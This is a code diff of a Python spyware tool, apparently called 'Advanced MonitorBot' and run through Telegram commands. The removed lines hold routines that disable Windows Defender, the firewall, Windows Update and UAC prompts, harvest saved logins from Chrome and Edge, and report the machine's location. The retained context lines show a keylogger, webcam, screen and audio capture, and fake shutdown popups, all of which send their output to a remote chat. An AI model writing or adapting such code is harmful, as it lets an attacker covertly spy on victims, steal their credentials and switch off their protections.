@@ -65,11 +65,6 @@ import psutil
 import tkinter as tk
 from threading import Thread
 import re
-import sqlite3
-import shutil
-import json
-from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-from cryptography.hazmat.backends import default_backend
 from pynput import keyboard
 
 try:
@@ -292,17 +287,6 @@ class TelegramBot:
         except Exception as e:
             logger.log_error(f"Send file error: {e}")
             return False
-    
-    def send_location(self, lat, lon):
-        """Send location to Telegram"""
-        data = {
-            "chat_id": self.chat_id,
-            "latitude": lat,
-            "longitude": lon
-        }
-        
-        response = self._api_request("sendLocation", data=data)
-        return bool(response and response.status_code == 200)
 
 # ==================== CAPTURE SYSTEM ====================
 class CaptureManager:
@@ -598,251 +582,6 @@ class KeyLogger:
         self.send_log()  # Send final log
         logger.log_info("Keylogger stopped")
 
-# ==================== SECURITY CONTROL SYSTEM ====================
-class SecurityController:
-    """Windows security controls management"""
-    
-    @staticmethod
-    def windows_update_control(enable=True):
-        """Control Windows Update service"""
-        try:
-            if enable:
-                commands = [
-                    "sc config wuauserv start= auto",
-                    "net start wuauserv",
-                    'powershell -Command "Set-Service -Name wuauserv -StartupType Automatic"',
-                    'powershell -Command "Start-Service -Name wuauserv"'
-                ]
-                action = "enabled"
-            else:
-                commands = [
-                    "net stop wuauserv",
-                    "sc config wuauserv start= disabled",
-                    'powershell -Command "Stop-Service -Name wuauserv"',
-                    'powershell -Command "Set-Service -Name wuauserv -StartupType Disabled"'
-                ]
-                action = "disabled"
-            
-            return SecurityController._execute_commands(commands, f"Windows Update {action}")
-            
-        except Exception as e:
-            logger.log_error(f"Windows update control failed: {e}")
-            return False, str(e)
-    
-    @staticmethod
-    def windows_firewall_control(enable=True):
-        """Control Windows Firewall"""
-        try:
-            if enable:
-                commands = [
-                    "netsh advfirewall set allprofiles state on",
-                    'powershell -Command "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True"'
-                ]
-                action = "enabled"
-            else:
-                commands = [
-                    "netsh advfirewall set allprofiles state off",
-                    'powershell -Command "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False"'
-                ]
-                action = "disabled"
-            
-            return SecurityController._execute_commands(commands, f"Windows Firewall {action}")
-            
-        except Exception as e:
-            logger.log_error(f"Windows firewall control failed: {e}")
-            return False, str(e)
-    
-
-    @staticmethod
-    def defender_realtime_control(enable=True):
-        """Control Windows Defender Realtime Protection using Group Policy"""
-        try:
-            if not SystemUtils.is_admin():
-                return False, "Administrator privileges required"
-            
-            if enable:
-                commands = [
-                    'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $false"',
-                    'powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $false"',
-                    'powershell -Command "Set-MpPreference -DisableIOAVProtection $false"',
-                    'powershell -Command "Set-MpPreference -DisableScriptScanning $false"',
-                    # Remove Group Policy restrictions
-                    'reg delete "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /f',
-                    'reg delete "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /f /reg:64',
-                    'gpupdate /force',
-                    'net stop WinDefend',
-                    'net start WinDefend'
-                ]
-                action = "enabled"
-            else:
-                commands = [
-                    # Group Policy Registry Keys - This will force disable via Group Policy
-                    'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f',
-                    'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f',
-                    'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f',
-                    'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f',
-                    'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f',
-                    'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableIOAVProtection /t REG_DWORD /d 1 /f',
-                    # Force Group Policy update
-                    'gpupdate /force',
-                    # Stop Defender services
-                    'net stop WinDefend',
-                    'sc config WinDefend start= disabled',
-                    'net stop WdNisSvc',
-                    'sc config WdNisSvc start= disabled',
-                    'net stop Sense',
-                    'sc config Sense start= disabled'
-                ]
-                action = "disabled"
-            
-            success, details = SecurityController._execute_commands(commands, f"Defender Realtime {action}")
-            
-            if success:
-                # Additional verification
-                if not enable:
-                    time.sleep(2)
-                    # Double check if disabled
-                    verify_cmd = 'powershell -Command "Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled"'
-                    result = subprocess.run(verify_cmd, shell=True, capture_output=True, text=True)
-                    if "False" in result.stdout:
-                        details += "\n\n✅ Verification: Real-time Protection Successfully Disabled via Group Policy"
-                    else:
-                        details += "\n\n⚠️ Warning: May require reboot to fully apply Group Policy"
-            
-            return success, details
-            
-        except Exception as e:
-            logger.log_error(f"Defender control failed: {e}")
-            return False, str(e)
-    
-    @staticmethod
-    def uac_control(enable=True):
-        """Control User Account Control (UAC)"""
-        try:
-            if not SystemUtils.is_admin():
-                return False, "Administrator privileges required for UAC control"
-            
-            if enable:
-                commands = [
-                    'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v EnableLUA /t REG_DWORD /d 1 /f',
-                    'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 2 /f',
-                    'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v PromptOnSecureDesktop /t REG_DWORD /d 1 /f'
-                ]
-                action = "enabled"
-                description = "UAC Enabled (Always notify)"
-            else:
-                commands = [
-                    'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v EnableLUA /t REG_DWORD /d 1 /f',
-                    'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f',
-                    'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f'
-                ]
-                action = "disabled"
-                description = "UAC Disabled (No notifications)"
-            
-            success, details = SecurityController._execute_commands(commands, f"UAC {action}")
-            
-            if success:
-                return True, f"{description}\n\n{details}"
-            else:
-                return False, f"UAC control failed\n\n{details}"
-                
-        except Exception as e:
-            logger.log_error(f"UAC control failed: {e}")
-            return False, f"UAC control error: {str(e)}"
-    
-    @staticmethod
-    def get_security_status():
-        """Get comprehensive security status"""
-        status_info = ["🛡️ *Windows Security Status*", "=" * 35]
-        
-        try:
-            # Windows Update status
-            try:
-                result = subprocess.run(
-                    "sc query wuauserv", shell=True, 
-                    capture_output=True, text=True, timeout=15
-                )
-                if "RUNNING" in result.stdout:
-                    status_info.append("🟢 Windows Update: Running")
-                else:
-                    status_info.append("🔴 Windows Update: Stopped")
-            except:
-                status_info.append("❓ Windows Update: Unknown")
-            
-            # Firewall status
-            try:
-                result = subprocess.run(
-                    "netsh advfirewall show allprofiles state", shell=True,
-                    capture_output=True, text=True, timeout=15
-                )
-                if "ON" in result.stdout:
-                    status_info.append("🟢 Windows Firewall: Enabled")
-                else:
-                    status_info.append("🔴 Windows Firewall: Disabled")
-            except:
-                status_info.append("❓ Windows Firewall: Unknown")
-            
-            # Defender status
-            try:
-                result = subprocess.run(
-                    'powershell -Command "Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled"',
-                    shell=True, capture_output=True, text=True, timeout=15
-                )
-                if "True" in result.stdout:
-                    status_info.append("🟢 Defender Realtime: Enabled")
-                else:
-                    status_info.append("🔴 Defender Realtime: Disabled")
-            except:
-                status_info.append("❓ Defender Realtime: Unknown")
-            
-            # UAC status
-            try:
-                result = subprocess.run(
-                    'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v ConsentPromptBehaviorAdmin',
-                    shell=True, capture_output=True, text=True, timeout=15
-                )
-                if "0x0" in result.stdout:
-                    status_info.append("🔴 UAC: Disabled")
-                else:
-                    status_info.append("🟢 UAC: Enabled")
-            except:
-                status_info.append("❓ UAC: Unknown")
-            
-            return "\n".join(status_info)
-            
-        except Exception as e:
-            return f"Error getting security status: {str(e)}"
-    
-    @staticmethod
-    def _execute_commands(commands, description):
-        """Execute multiple commands and return results"""
-        success_count = 0
-        details = []
-        
-        for command in commands:
-            try:
-                result = subprocess.run(
-                    command, shell=True, 
-                    capture_output=True, text=True, timeout=30
-                )
-                
-                if result.returncode == 0:
-                    success_count += 1
-                    details.append(f"✅ {command}")
-                else:
-                    error_msg = result.stderr.strip() if result.stderr else "Unknown error"
-                    details.append(f"❌ {command} - Error: {error_msg}")
-                    
-            except Exception as e:
-                details.append(f"❌ {command} - Exception: {str(e)}")
-        
-        logger.log_info(f"{description}: {success_count}/{len(commands)} successful")
-        
-        if success_count >= len(commands) // 2:
-            return True, "\n".join(details)
-        else:
-            return False, "\n".join(details)
-
 # ==================== LOCATION SERVICES ====================
 class LocationService:
     """Location and system information services"""
@@ -913,38 +652,6 @@ class LocationService:
         except Exception as e:
             logger.log_error(f"System info failed: {e}")
             return {}
-    
-    @staticmethod
-    def build_location_message():
-        """Build comprehensive location and system message"""
-        geo_info = LocationService.get_geo_info()
-        system_info = LocationService.get_system_info()
-        
-        coordinates = f"{geo_info['latitude']}, {geo_info['longitude']}" \
-                    if geo_info['latitude'] and geo_info['longitude'] else "N/A"
-        
-        message = f"""📍 *System & Location Information*
-
-💻 *System Overview*
-• Hostname: `{system_info.get('hostname', 'N/A')}`
-• Username: `{system_info.get('username', 'N/A')}`
-• OS: `{system_info.get('os', 'N/A')}`
-• CPU Usage: `{system_info.get('cpu_usage', 'N/A')}%`
-• RAM Usage: `{system_info.get('ram_usage', 'N/A')}%` ({system_info.get('ram_total', 'N/A')} GB)
-• Battery: `{system_info.get('battery', 'N/A')}`
-• Disk: `{system_info.get('disk_used', 'N/A')}/{system_info.get('disk_total', 'N/A')} GB`
-• Network: `{system_info.get('network', 'N/A')}`
-
-🌍 *Geographical Information*
-• IP Address: `{geo_info['ip']}`
-• City: `{geo_info['city']}`
-• Region: `{geo_info['region']}`
-• Country: `{geo_info['country']}`
-• Coordinates: `{coordinates}`
-
-🕒 *Current Time*: {SystemUtils.timestamp_now()}
-"""
-        return message, geo_info
 
 # ==================== SPECIAL EFFECTS ====================
 class SpecialEffects:
@@ -1046,114 +753,6 @@ class SpecialEffects:
                 logger.log_error(f"Battery shutdown simulation error: {e}")
         
         Thread(target=simulate_shutdown, daemon=True).start()
-
-# ==================== BROWSER PASSWORD RECOVERY ====================
-class PasswordRecovery:
-    """Browser password recovery system"""
-    
-    @staticmethod
-    def get_browser_passwords():
-        """Recover browser passwords"""
-        passwords_data = [
-            "🔑 *Browser Passwords Recovery Report*",
-            "=" * 45
-        ]
-        
-        try:
-            # Chrome passwords
-            chrome_count = PasswordRecovery._get_chrome_passwords(passwords_data)
-            
-            # Edge passwords
-            edge_count = PasswordRecovery._get_edge_passwords(passwords_data)
-            
-            # Summary
-            if chrome_count == 0 and edge_count == 0:
-                passwords_data.append("\n❌ No passwords found in any browser")
-            else:
-                passwords_data.append(f"\n📊 Summary: Chrome({chrome_count}), Edge({edge_count})")
-                
-        except Exception as e:
-            passwords_data.append(f"\n❌ Critical Error: {str(e)}")
-        
-        return passwords_data
-    
-    @staticmethod
-    def _get_chrome_passwords(passwords_data):
-        """Get Chrome passwords"""
-        try:
-            chrome_path = os.path.join(
-                os.environ['USERPROFILE'],
-                'AppData', 'Local', 'Google', 'Chrome',
-                'User Data', 'Default', 'Login Data'
-            )
-            
-            if not os.path.exists(chrome_path):
-                return 0
-            
-            temp_db = os.path.join(config.QUEUE_DIR, "temp_chrome.db")
-            shutil.copy2(chrome_path, temp_db)
-            
-            connection = sqlite3.connect(temp_db)
-            cursor = connection.cursor()
-            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
-            
-            count = 0
-            for url, username, encrypted_password in cursor.fetchall():
-                if url and username:
-                    passwords_data.append(f"\n🌐 URL: {url}")
-                    passwords_data.append(f"👤 Username: {username}")
-                    passwords_data.append(f"🔒 Password: [Encrypted - Master Key Required]")
-                    passwords_data.append("-" * 40)
-                    count += 1
-            
-            connection.close()
-            os.remove(temp_db)
-            
-            passwords_data.append(f"\n✅ Chrome: Found {count} passwords")
-            return count
-            
-        except Exception as e:
-            passwords_data.append(f"\n❌ Chrome Error: {str(e)}")
-            return 0
-    
-    @staticmethod
-    def _get_edge_passwords(passwords_data):
-        """Get Edge passwords"""
-        try:
-            edge_path = os.path.join(
-                os.environ['USERPROFILE'],
-                'AppData', 'Local', 'Microsoft', 'Edge',
-                'User Data', 'Default', 'Login Data'
-            )
-            
-            if not os.path.exists(edge_path):
-                return 0
-            
-            temp_db = os.path.join(config.QUEUE_DIR, "temp_edge.db")
-            shutil.copy2(edge_path, temp_db)
-            
-            connection = sqlite3.connect(temp_db)
-            cursor = connection.cursor()
-            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
-            
-            count = 0
-            for url, username, encrypted_password in cursor.fetchall():
-                if url and username:
-                    passwords_data.append(f"\n🌐 URL: {url}")
-                    passwords_data.append(f"👤 Username: {username}")
-                    passwords_data.append(f"🔒 Password: [Encrypted - Master Key Required]")
-                    passwords_data.append("-" * 40)
-                    count += 1
-            
-            connection.close()
-            os.remove(temp_db)
-            
-            passwords_data.append(f"\n✅ Edge: Found {count} passwords")
-            return count
-            
-        except Exception as e:
-            passwords_data.append(f"\n❌ Edge Error: {str(e)}")
-            return 0
 
 # ==================== LIVE AUDIO STREAMING ====================
 class LiveAudioStream:
@@ -1319,14 +918,6 @@ class StartupManager:
         try:
             bot.send_message("🚀 *System Startup Detected*")
             
-            # Send system information
-            location_msg, geo_info = LocationService.build_location_message()
-            bot.send_message(location_msg)
-            
-            # Send location if available
-            if geo_info.get('latitude') and geo_info.get('longitude'):
-                bot.send_location(geo_info['latitude'], geo_info['longitude'])
-            
             # Send desktop screenshot
             desktop = capture_manager.capture_desktop()
             if desktop:
@@ -1341,24 +932,6 @@ class StartupManager:
                 
         except Exception as e:
             logger.log_error(f"Startup capture error: {e}")
-    
-    @staticmethod
-    def clear_local_storage():
-        """Clear local storage"""
-        try:
-            for filename in os.listdir(config.QUEUE_DIR):
-                file_path = os.path.join(config.QUEUE_DIR, filename)
-                try:
-                    if os.path.isfile(file_path):
-                        os.remove(file_path)
-                except Exception as e:
-                    logger.log_error(f"File deletion failed: {file_path} - {e}")
-            
-            logger.log_info("Local storage cleared")
-            return True
-        except Exception as e:
-            logger.log_error(f"Storage clearance failed: {e}")
-            return False
 
 # ==================== COMMAND HANDLER ====================
 class CommandHandler:
@@ -1442,70 +1015,8 @@ class CommandHandler:
         """Process individual commands"""
         global monitor_active, config
         
-        # 🛡️ UAC Control Commands
-        if text == "/uacon":
-            success, details = SecurityController.uac_control(enable=True)
-            if success:
-                self.bot.send_message(f"🛡️ UAC Enabled\n\n{details}")
-            else:
-                self.bot.send_message(f"❌ UAC Enable Failed\n\n{details}")
-        
-        elif text == "/uacoff":
-            success, details = SecurityController.uac_control(enable=False)
-            if success:
-                self.bot.send_message(f"🛡️ UAC Disabled\n\n{details}")
-            else:
-                self.bot.send_message(f"❌ UAC Disable Failed\n\n{details}")
-        
-        # 🛡️ Security Control Commands
-        elif text == "/winupdateon":
-            success, details = SecurityController.windows_update_control(enable=True)
-            if success:
-                self.bot.send_message(f"✅ Windows Update Enabled\n\n{details}")
-            else:
-                self.bot.send_message(f"❌ Windows Update Enable Failed\n\n{details}")
-        
-        elif text == "/winupdateoff":
-            success, details = SecurityController.windows_update_control(enable=False)
-            if success:
-                self.bot.send_message(f"✅ Windows Update Disabled\n\n{details}")
-            else:
-                self.bot.send_message(f"❌ Windows Update Disable Failed\n\n{details}")
-        
-        elif text == "/firewallon":
-            success, details = SecurityController.windows_firewall_control(enable=True)
-            if success:
-                self.bot.send_message(f"✅ Firewall Enabled\n\n{details}")
-            else:
-                self.bot.send_message(f"❌ Firewall Enable Failed\n\n{details}")
-        
-        elif text == "/firewalloff":
-            success, details = SecurityController.windows_firewall_control(enable=False)
-            if success:
-                self.bot.send_message(f"✅ Firewall Disabled\n\n{details}")
-            else:
-                self.bot.send_message(f"❌ Firewall Disable Failed\n\n{details}")
-        
-        elif text == "/realtimeon":
-            success, details = SecurityController.defender_realtime_control(enable=True)
-            if success:
-                self.bot.send_message(f"✅ Defender Realtime Enabled\n\n{details}")
-            else:
-                self.bot.send_message(f"❌ Defender Enable Failed\n\n{details}")
-        
-        elif text == "/realtimeoff":
-            success, details = SecurityController.defender_realtime_control(enable=False)
-            if success:
-                self.bot.send_message(f"✅ Defender Realtime Disabled\n\n{details}")
-            else:
-                self.bot.send_message(f"❌ Defender Disable Failed\n\n{details}")
-        
-        elif text == "/securitystatus":
-            status = SecurityController.get_security_status()
-            self.bot.send_message(status)
-        
         # 🔍 Monitoring Commands
-        elif text == "/monitoron":
+        if text == "/monitoron":
             with monitor_lock:
                 monitor_active = True
             self.bot.send_message("🟢 Monitoring Enabled")
@@ -1536,12 +1047,6 @@ class CommandHandler:
             status_msg = f"💻 CPU: {system_info.get('cpu_usage', 'N/A')}% | RAM: {system_info.get('ram_usage', 'N/A')}%"
             self.bot.send_message(status_msg)
         
-        elif text == "/location":
-            location_msg, geo_info = LocationService.build_location_message()
-            self.bot.send_message(location_msg)
-            if geo_info.get('latitude') and geo_info.get('longitude'):
-                self.bot.send_location(geo_info['latitude'], geo_info['longitude'])
-        
         # ⌨️ Advanced Features
         elif text == "/keylogstart":
             if keylogger.start():
@@ -1556,17 +1061,6 @@ class CommandHandler:
         elif text == "/keylogsend":
             keylogger.send_log()
             self.bot.send_message("📤 Keylogs Sent")
-        
-        elif text == "/passwords":
-            passwords = PasswordRecovery.get_browser_passwords()
-            if passwords and len(passwords) > 2:
-                pass_file = os.path.join(config.QUEUE_DIR, "passwords.txt")
-                with open(pass_file, "w", encoding="utf-8") as f:
-                    f.write("\n".join(passwords))
-                self.bot.send_file(pass_file, "document", "🔑 Browser Passwords")
-                os.remove(pass_file)
-            else:
-                self.bot.send_message("❌ No passwords found")
         
         elif text.startswith("/recordvideo"):
             try:
@@ -1661,13 +1155,6 @@ class CommandHandler:
             else:
                 self.bot.send_message("❌ Usage: /note <message>")
         
-        # 🗑️ Cleanup
-        elif text == "/historyclear":
-            if StartupManager.clear_local_storage():
-                self.bot.send_message("🗑️ History Cleared")
-            else:
-                self.bot.send_message("❌ Clear failed")
-        
         elif text == "/help":
             self.bot.send_message(self.get_help_text())
         
@@ -1680,32 +1167,17 @@ class CommandHandler:
         return """
 🎯 *Advanced MonitorBot - Command List*
 
-🛡️ *UAC Control*
-• `/uacon` - UAC Enable
-• `/uacoff` - UAC Disable
-
-🛡️ *Security Control*  
-• `/winupdateon` - Windows Update Enable
-• `/winupdateoff` - Windows Update Disable
-• `/firewallon` - Firewall Enable
-• `/firewalloff` - Firewall Disable
-• `/realtimeon` - Defender Enable
-• `/realtimeoff` - Defender Disable
-• `/securitystatus` - Security Status
-
 🔍 *Monitoring*
 • `/monitoron` - Start Monitoring
 • `/monitoroff` - Stop Monitoring  
 • `/screenshot` - Desktop Screenshot
 • `/photo` - Webcam Photo
 • `/status` - System Status
-• `/location` - Location Info
 
 ⌨️ *Advanced Features*
 • `/keylogstart` - Start Keylogger
 • `/keylogstop` - Stop Keylogger
 • `/keylogsend` - Send Keylogs
-• `/passwords` - Browser Passwords
 • `/recordvideo [sec]` - Record Video
 • `/livestream [sec]` - Live Audio
 
@@ -1721,9 +1193,6 @@ class CommandHandler:
 • `/fakelow [%]` - Fake Battery
 • `/fakelowshutdown` - Fake Shutdown
 • `/note <msg>` - Popup Note
-
-🗑️ *Cleanup*
-• `/historyclear` - Clear History
 
 🆘 *Help*
 • `/help` - This Message
